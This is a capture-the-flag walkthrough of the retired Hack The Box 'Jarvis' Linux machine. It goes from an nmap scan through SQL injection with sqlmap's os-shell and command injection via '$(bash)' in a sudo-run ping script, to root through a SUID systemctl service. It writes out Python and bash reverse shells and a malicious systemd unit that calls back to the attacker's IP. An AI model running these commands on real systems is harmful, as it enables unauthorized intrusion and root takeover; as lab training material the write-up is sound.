# Hack The Box - Jarvis walkthrough
![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/jarvis.png?raw=true)

This walkthrough is about the retired Jarvis machine of Hack The box. </br>
It is a Linux based machine. </br>
This machine has a static IP address <10.10.10.143> </br>
It was a nice bit easy machine. </br>
</br>
You have to found **user.txt** and **root.txt** flag. </br> 

## Penetration Methodology

* **Scanning**
  * open ports and services
* **Enumeration**
  * Enumerating the website about vulnerablities
* **Exploitation**
  * SQLI
  * exploitation using sqlmap
  * os-shell with sqlmap
  * machine access with Reverse-shell
* **Post Exploitation**
  * getting user access
  * privelage escalation from user to root
  
Now start pentesting the **Jarvis** machine. </br>

## Checking for open ports and services

We used **nmap** for checing the open ports and what services are running.
![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/nmap.png)

As we can see that port **22** and **80** are open.

**Now start enumerating the website**

When we reach the website we got a page like this </br>
![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/page.png)

## Enumerating the Website

**While enumerating the website after some time we found a page room.php** </br>

![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/sql_vul_room.png)

**This seems to be sql vulnerable** --> `<10.10.10.143/room.php?cod=1>` 

## Exploitation using sqlmap

Then we tried **sqlmap** with **--os-shell**
**using this** 
* `sqlmap -u http://10.10.10.143/room.php?cod=1 --os-shell`

![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/sqlmap_1.png)

And we got the shell

![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/sql_1.png)

Now we can use any reverse shell to get access of the machine

**I have used the python reverse shell**

Simply execute the reverse shell and also start the listener </br>

* `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your ip>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

**We got the shell but it is not the proper user**

![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/conn.png)

Now we are www-data user so we enumerate for **user.txt** flag

![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/enu_ww.png)

As we can see that only root and pepper user has privelages to read **user.txt** </br>
So we have to escalate our privelage to **pepper** user.

## Post Exploitation

So after some enumerating I look into **sudoers file**

![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/w_perm.png)

As we can see that **www-data** can run **/var/www/Admin-Utilities/simpler.py** </br>
with **pepper** user permission.

So we go through the **/var/www/Admin-Utilities/simpler.py** python file </br>
and in that we can see a **exec_ping** function and it looks something suspicious for privelage escalation to **pepper**.

![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/ping.png)

As there are some blacklist symbols but **$** symbol is not blacklisted. </br>

So we simply run 
* ` sudo -u pepper /var/www/Admin-Utilities/simpler.py -p `
with **-p** which is ping option

Then it pop up with **Enter an IP** option </br>
There use the non-blacklisted symbol with bash command
* ` $(bash) `

![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/pepper_shell.png)

**We got the pepper user** </br>

But we are not able to run any command so we try to get a reverse shell from **pepper** user </br>
and also start a listener

So I simply run a bash reverse shell command 
* `bash -i >& /dev/tcp/<your ip>/1234 0>&1`

And we got the new **pepper** user shell
Then we enumerate ffor **user.txt**
* `ls -al`
* `cat user.txt`

![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/user.png)

Now we have to read our **root.txt** flag </br>
So for that we have to escalate our privelage to **root**.

So firstly we check for **SUID bit SET**
* `find / -perm -u=s -type f 2>/dev/null`

![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/suid.png)

Here we find **/bin/systemctl** service running with **root** permission </br>

* As Systemctl is a systemd utility that is responsible for Controlling the systemd system and service manager.

So we make a new service named shell.service </br>
	
```
[Unit]
Description=hacking articles 
[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<your ip>/8888 0>&1'
[Install]
WantedBy=multi-user.target
```

Now download that service file from machine to **Jarvis** machine </br>
Now enable the service
* /bin/systemctl enable /home/pepper/shell.service
* /bin/systemctl start shell

![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/ena.png)

Now start the listener again

![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/root.png)

**We got the root.txt flag**
This is very good machine and I learn a lot of new things.

Author: Hardik Chugh
